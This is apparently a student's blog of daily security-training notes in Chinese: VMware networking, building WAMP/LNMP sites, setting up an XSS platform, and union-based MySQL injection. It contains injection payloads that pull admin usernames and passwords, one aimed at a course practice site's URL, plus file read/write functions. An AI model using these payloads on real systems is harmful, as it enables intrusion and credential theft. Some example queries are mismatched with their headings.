<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="WE WERE BORN TO MAKE HISTORY">
<meta property="og:type" content="website">
<meta property="og:title" content="LUOSY&#39;S BLOG">
<meta property="og:url" content="https://luosyrrrr.github.io/index.html">
<meta property="og:site_name" content="LUOSY&#39;S BLOG">
<meta property="og:description" content="WE WERE BORN TO MAKE HISTORY">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="LUOSY">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://luosyrrrr.github.io/"/>





  <title>LUOSY'S BLOG</title>
  








<meta name="generator" content="Hexo 6.2.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">LUOSY'S BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Cyber security->AI</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luosyrrrr.github.io/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LUOSY'S BLOG">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/" itemprop="url">实训每日记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-16T16:54:59+08:00">
                2022-08-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%B8%8A%E8%AF%BE%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index">
                    <span itemprop="name">上课记录</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <span id="more"></span>

<h2 id="0711第一天"><a href="#0711第一天" class="headerlink" title="0711第一天"></a>0711第一天</h2><h3 id="任务一-认识虚拟机管理器"><a href="#任务一-认识虚拟机管理器" class="headerlink" title="任务一.认识虚拟机管理器"></a>任务一.认识虚拟机管理器</h3><p>管理虚拟机，虚拟网络，虚拟机内部网络管理</p>
<p>虚拟机增删改查</p>
<p>一个虚拟机最多多少IP？</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711101912959.png" alt="image-20220711101912959"></p>
<p>192.168.61.1这个ip地址属于网关ip地址还是网管分配给本机的？</p>
<p>是本机的ip地址</p>
<p>.1一般都是分配给网关的？</p>
<p>192.168.61.1其实是物理机上的虚拟网卡的ip地址</p>
<p>网关ip地址是</p>
<h3 id="任务二-配置虚拟网络"><a href="#任务二-配置虚拟网络" class="headerlink" title="任务二.配置虚拟网络"></a>任务二.配置虚拟网络</h3><p>1.新建一张虚拟网络，让其中的主机具备局域网ip，而且能够上公网：（NAT</p>
<p>vmnet8的主机号是多少？.2</p>
<p>2.新建一张虚拟网络，让其中的虚拟机获取相同物理网卡通网络ip，并且能上公网（桥接模式</p>
<p>3.新建一张虚拟网络，仅能让其中的主机进行相互通信，不能上公网（仅主机</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711102520974.png" alt="image-20220711102520974"></p>
<p>公网的主机无法直接访问内网，但其实公网内网主机能够进行直接通信，内网主机可以主动向外网主机建立联系（通信），外网的则不行</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711102918083.png" alt="image-20220711102918083"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711103012389.png" alt="image-20220711103012389"></p>
<p>虚拟主机网关号多少？.2</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711104355879.png" alt="image-20220711104355879"></p>
<h3 id="任务三-搭建WAMP网站"><a href="#任务三-搭建WAMP网站" class="headerlink" title="任务三.搭建WAMP网站"></a>任务三.搭建WAMP网站</h3><p>目标：windows中搭建一个wamp架构的论坛网站（安装配置三大组件）</p>
<p>再litexp虚拟中操作</p>
<p>1.安装vmware tools并重启 （安装w</p>
<p>2.安装phpstudy （安装amp</p>
<p>3.解压discuz，并上传到虚拟机网站根目录下（在网站上部署代码</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711113146781.png" alt="image-20220711113146781"></p>
<p>物理机浏览器中访问虚拟机ip地址，进行论坛安装</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711113233608.png" alt="image-20220711113233608"></p>
<h3 id="任务四-搭建xss平台和Ubuntu安装"><a href="#任务四-搭建xss平台和Ubuntu安装" class="headerlink" title="任务四.搭建xss平台和Ubuntu安装"></a>任务四.搭建xss平台和Ubuntu安装</h3><p>截图结果：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712162649068.png" alt="image-20220712162649068"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712162718162.png" alt="image-20220712162718162"></p>
<p>XSS平台(xsser.me)搭建</p>
<p><strong>一、下载源码</strong></p>
<p>下载压缩包解压到网站根目录的xsser文件夹中</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71541" alt="0"></p>
<p><strong>二、配置环境</strong></p>
<p>1、修改config.php里面的数据库连接字段，包括用户名（root），密码（root），数据库名（xssplatform）</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71542" alt="0"></p>
<p>2、修改访问的url起始地址为:<a target="_blank" rel="noopener" href="http://192.168.68.134/xsser">http://192.168.68.134/xsser</a> （<strong>其中ip为部署的攻击机的ip）</strong></p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71543" alt="0"></p>
<p>3、在phpmyadmin中新建xssplatform数据库</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71544" alt="0"></p>
<p>4、phpmyadmin导入SQL（该sql文件在xsser应用的目录下）</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71545" alt="0"></p>
<p>执行之后会多出9张表</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71546" alt="0"></p>
<p>5、进入数据库执行下列语句（粘贴后点击右下角执行的GO按钮），作用是将原网址xsser.me修改网址为自己的（修改后到oc_module表中确认是否更改成功）</p>
<p>​                UPDATE oc_module SET code&#x3D;REPLACE(code,’<a target="_blank" rel="noopener" href="http://xsser.me&/#39;,&#39;http://192.168.68.137/xsser&#39;">http://xsser.me&#39;,&#39;http://192.168.68.137/xsser&#39;</a>);              </p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71547" alt="0"></p>
<p>6、建立rewrite规则</p>
<p>在xsser目录下建立.htaccess伪静态文件</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71548" alt="0"></p>
<p>并加入以下内容、注意如果伪静态没配置成功，那么下面xsser生成的项目中的URL将不能访问!!!</p>
<p>范例： </p>
<p>Apache：</p>
<p>需要注意复制粘贴的问题</p>
<p>​                RewriteEngine On RewriteRule ^([0-9a-zA-Z]{6})$ &#x2F;xsser&#x2F;index.php?do&#x3D;code&amp;urlKey&#x3D;$1 [L] RewriteRule ^do&#x2F;auth&#x2F;(\w+?)(&#x2F;domain&#x2F;([\w.]+?))?$ &#x2F;xsser&#x2F;index.php?do&#x3D;do&amp;auth&#x3D;$1&amp;domain&#x3D;$3 [L] RewriteRule ^register&#x2F;(.<em>?)$ &#x2F;xsser&#x2F;index.php?do&#x3D;register&amp;key&#x3D;$1 [L] RewriteRule ^register-validate&#x2F;(.</em>?)$ &#x2F;xsser&#x2F;index.php?do&#x3D;register&amp;act&#x3D;validate&amp;key&#x3D;$1 [L] RewriteRule ^login$ &#x2F;xsser&#x2F;index.php?do&#x3D;login [L]              </p>
<p>Nginx：</p>
<p>​                rewrite “^&#x2F;([0-9a-zA-Z]{6})$” &#x2F;index.php?do&#x3D;code&amp;urlKey&#x3D;$1 last;  rewrite “^&#x2F;do&#x2F;auth&#x2F;(\w+?)(&#x2F;domain&#x2F;([\w.]+?))?$” &#x2F;index.php?do&#x3D;do&amp;auth&#x3D;$1&amp;domain&#x3D;$3 last;  rewrite “^&#x2F;register&#x2F;(.<em>?)$” &#x2F;index.php?do&#x3D;register&amp;key&#x3D;$1 last;  rewrite “^&#x2F;register-validate&#x2F;(.</em>?)$” &#x2F;index.php?do&#x3D;register&amp;act&#x3D;validate&amp;key&#x3D;$1 last;              </p>
<p>7、把注册配置修改为normal进行保存（改config.php文件，$config[‘register’]		&#x3D;’normal’;）</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71549" alt="0"></p>
<p><strong>三、使用</strong></p>
<p>访问这个地址:<a target="_blank" rel="noopener" href="http://192.168.68.134/xsser/index.php">http://192.168.68.134/xsser/index.php</a> ，出现如下界面：</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71550" alt="0"></p>
<p>注册。注册时：邀请码随便填写，其他的都是注册的时候需要的</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71551" alt="0"></p>
<p>点击提交注册如果发现没反应的，则需要进行修改（有跳转则不改）：审查下元素，就能发现，他把type&#x3D;submit写成了type&#x3D;button，改回来就可以了。</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71552" alt="0"></p>
<p>就完成了注册。注册成功之后他会跳到这个页面</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71553" alt="0"></p>
<p><strong>四、测试</strong></p>
<p>新建一个项目、测试其中的地址</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71554" alt="0"></p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71555" alt="0"></p>
<p>点击下一步</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71556" alt="0"></p>
<p>点击下一步创建完成。</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71557" alt="0"></p>
<p>能访问则说明伪静态配置成功</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71558" alt="0"></p>
<p>如果伪静态没有配置成功就会出现下面的错误</p>
<p>​    <img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/71559" alt="0"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711141536646.png" alt="image-20220711141536646"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711141623732.png" alt="image-20220711141623732"></p>
<p>ubuntu22 用户名luosy</p>
<p>密码123456</p>
<h3 id="任务五-部署LNMP网站"><a href="#任务五-部署LNMP网站" class="headerlink" title="任务五.部署LNMP网站"></a>任务五.部署LNMP网站</h3><p>WAMP和LNMP</p>
<p>LNWMP：linux、Nginx、MySql、PHP</p>
<p>LNMP在ubuntu上面安装</p>
<p>1.先将xshell与ubuntu相连</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711201959966.png" alt="image-20220711201959966"></p>
<p>2.安装nginx</p>
<p>3.安装数据库</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711202504077.png" alt="image-20220711202504077"></p>
<p>4.安装php</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220711201912489.png" alt="image-20220711201912489"></p>
<h2 id="0712第二天"><a href="#0712第二天" class="headerlink" title="0712第二天"></a>0712第二天</h2><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>select * from t_Xx where col_xx&#x3D;2 order by 5;</p>
<p>select * from t_Xx where col_xx&#x3D;2 union select 1,2,3,4,5;</p>
<p>select * from t_Xx where col_xx&#x3D;-1 union select 1,2,database(),4,5;</p>
<p>database函数-》库名</p>
<p>通过联合查询得到想要的信息，比如管理员账号密码</p>
<p>1.判断表的列数</p>
<p>2.使用联合查询查</p>
<p>   1.库名</p>
<p>通过database（） double_fish</p>
<p>   2.表名</p>
<p>t_admin</p>
<p>select * from t_Xx where col_xx&#x3D;-1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema&#x3D;’double_fish’</p>
<p> 3.列名</p>
<p>user password</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712092436698.png" alt="image-20220712092436698"></p>
<p>   4.管理员账号密码记录</p>
<p>select  username,password from t_admin</p>
<p>select * from t_Xx where col_xx&#x3D;-1 union select 1,username,password,4,5 from t_admin;</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712092828265.png" alt="image-20220712092828265"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712093815578.png" alt="image-20220712093815578"></p>
<h3 id="任务一-虚拟机镜像出一个靶机"><a href="#任务一-虚拟机镜像出一个靶机" class="headerlink" title="任务一.虚拟机镜像出一个靶机"></a>任务一.虚拟机镜像出一个靶机</h3><p>在靶机中安装vmware-tools和phpstudy</p>
<h3 id="任务二-了解mysql的注入相关语法"><a href="#任务二-了解mysql的注入相关语法" class="headerlink" title="任务二.了解mysql的注入相关语法"></a>任务二.了解mysql的注入相关语法</h3><h5 id="sqli基础"><a href="#sqli基础" class="headerlink" title="sqli基础"></a>sqli基础</h5><ol>
<li>union和union all</li>
</ol>
<p>​	union和union all都是联合查询，用于连接两个以上的 SELECT 语句的结果组合到一个结果集合 中，区别在于union会去除重复的结果，union all不会</p>
<p>​	要注意的是前后两个select语句中的列数必须一致</p>
<ol start="2">
<li>group_concat 和 concat</li>
</ol>
<p>​	concat函数用于将多个字符串连接到一起形成一个字符串，通常用于将多列合并到一列。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#x27;列名1&#x27;,&#x27;列名2&#x27;,&#x27;列名3&#x27;);</span><br><span class="line"></span><br><span class="line">select concat(username,password) from t_user;</span><br></pre></td></tr></table></figure>

<p>​	group_concat函数会将要查询的结果以一个组合的形式返回，group_concat需要和group_by函数 配合使用，否则会将返回结果以一行显示。通常用于将多条记录合并为一条记录。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,group_concat(address) from t_user group by username;</span><br></pre></td></tr></table></figure>

<p>​	除此之外还可以使用Separator关键字加分隔符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,group_concat(address order by address asc separator &#x27;_&#x27;) from t_user group by username;</span><br></pre></td></tr></table></figure>



<ol start="3">
<li>concat_ws()</li>
</ol>
<p>eg.：concat_ws(‘|’, 列名1,列名2……)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;|&#x27;, &#x27;列名1&#x27;,&#x27;列名2&#x27;,&#x27;列名3&#x27;);</span><br></pre></td></tr></table></figure>



<ol start="4">
<li>length</li>
</ol>
<p>该函数用于获取字符串字节的长度。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length(&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure>



<ol start="5">
<li>mid()</li>
</ol>
<p>SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被 SQL Server和 Oracle支持。在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select mid(&#x27;qeqweq&#x27;,1,4);</span><br></pre></td></tr></table></figure>



<ol start="6">
<li>left()</li>
</ol>
<p>LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。 </p>
<p>用法：LEFT(str,length)</p>
<p>LEFT()函数接受两个参数：</p>
<ul>
<li><p>str是要提取子字符串的字符串。 </p>
</li>
<li><p>length是一个正整数，指定将从左边返回的字符数。</p>
</li>
</ul>
<p>LEFT()函数返回str字符串中最左边的长度字符。如果str或length参数为NULL，则返回NULL值。 如果length为0或为负，则LEFT函数返回一个空字符串。如果length大于str字符串的长度，则LEFT 函数返回整个str字符串。</p>
<p> 请注意，SUBSTRING(或SUBSTR)函数也提供与LEFT函数相同的功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#x27;username&#x27;,2,4);</span><br></pre></td></tr></table></figure>



<ol start="7">
<li>substr()</li>
</ol>
<p>substr和mid函数的作用和用法基本相同，只不过substr支持的数据库更多，mid只支持mysql数 据库。 </p>
<p>用法：substr(string string,num start,num length);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#x27;username&#x27;,2,4);</span><br></pre></td></tr></table></figure>



<ol start="8">
<li>ascii()</li>
</ol>
<p>ascii函数用来返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是 NULL，返回NULL。这个函数可以和substr函数配合来使用猜测一个字符。10进制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#x27;a&#x27;);</span><br></pre></td></tr></table></figure>



<ol start="9">
<li>sleep()</li>
</ol>
<p>sleep函数可以让sql执行的时候暂停一段时间，函数的返回结果为0.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(username)from t_user</span><br></pre></td></tr></table></figure>



<ol start="10">
<li>if(expr1,expr2,expr3)</li>
</ol>
<p>语法如下： IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则 返回expr3的值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(username)from t_user</span><br></pre></td></tr></table></figure>



<ol start="11">
<li>count()</li>
</ol>
<p>count函数是用来统计表中或数组中记录的一个函数，下面我来介绍在MySQL中count函数用法与 性能比较吧。count(*) 它返回检索行的数目， 不论其是否包含 NULL值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(username)from t_user</span><br></pre></td></tr></table></figure>



<ol start="12">
<li>load_file()</li>
</ol>
<p>load_file()可以用来读取文件，此函数的执行必须使用dba权限或者root权限。 需要注意的是： </p>
<p>mysql 新版本下secure_file_priv字段 ： secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
<ul>
<li><p>当secure_file_priv的值为null ，表示限制mysqld 不允许导入,导出 </p>
</li>
<li><p>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入,导出只能发生在&#x2F;tmp&#x2F;目录下 </p>
</li>
<li><p>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入,导出做限制</p>
</li>
</ul>
<p>如何查看secure-file-priv参数的值：show global variables like ‘%secure%’;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;c:\\test.txt&#x27;);</span><br></pre></td></tr></table></figure>



<ol start="13">
<li>into outfile()</li>
</ol>
<p>into outfile()函数可以将字符串写入文件，此函数的执行也需要很大的权限，并且目标目录可写。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;666&#x27; into outfile &quot;c:\\test1.txt&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="任务三-了解information-schema数据库"><a href="#任务三-了解information-schema数据库" class="headerlink" title="任务三.了解information_schema数据库"></a>任务三.了解information_schema数据库</h3><p>了解information_schema数据库，并利用该库找到demo库的结构。</p>
<p>1.获取库名,需点击特定数据库后再执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure>

<p>2.获取表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;demo&#x27;;</span><br></pre></td></tr></table></figure>

<p>3.获取t_user表的列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema=&#x27;demo&#x27; and table_name=&#x27;t_user&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="任务四-先听讲，再练习，获取教务系统"><a href="#任务四-先听讲，再练习，获取教务系统" class="headerlink" title="任务四.先听讲，再练习，获取教务系统"></a>任务四.先听讲，再练习，获取教务系统</h3><p>完成模拟教务系统（<a target="_blank" rel="noopener" href="http://www.wabjtam.ml:12880/%EF%BC%89%E7%9A%84%E6%B3%A8%E5%85%A5%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81hash%E3%80%82">http://www.wabjtam.ml:12880/）的注入，获取管理员账号密码hash。</a></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220712153717190.png" alt="image-20220712153717190"></p>
<p>0.猜测后台查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx =3;</span><br></pre></td></tr></table></figure>

<p>1.获取列数：5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx =3 order by 10</span><br></pre></td></tr></table></figure>

<p>2.获取库名</p>
<p>database() select database();</p>
<p>double_fish</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from t_xx where col_xx =1 union select 1,2,3,4,5;</span><br><span class="line">select * from t_xx where col_xx =1 union select 1,2,database(),4,5;</span><br><span class="line">select * from t_xx where col_xx =-1 union select 1,2,database(),4,5;</span><br><span class="line">http://www.wabjtam.ml:12880/News/newsView.php?newsId=-1 union select 1,database(),3,4,5</span><br></pre></td></tr></table></figure>

<p>3.获取管理员表名 t_admin</p>
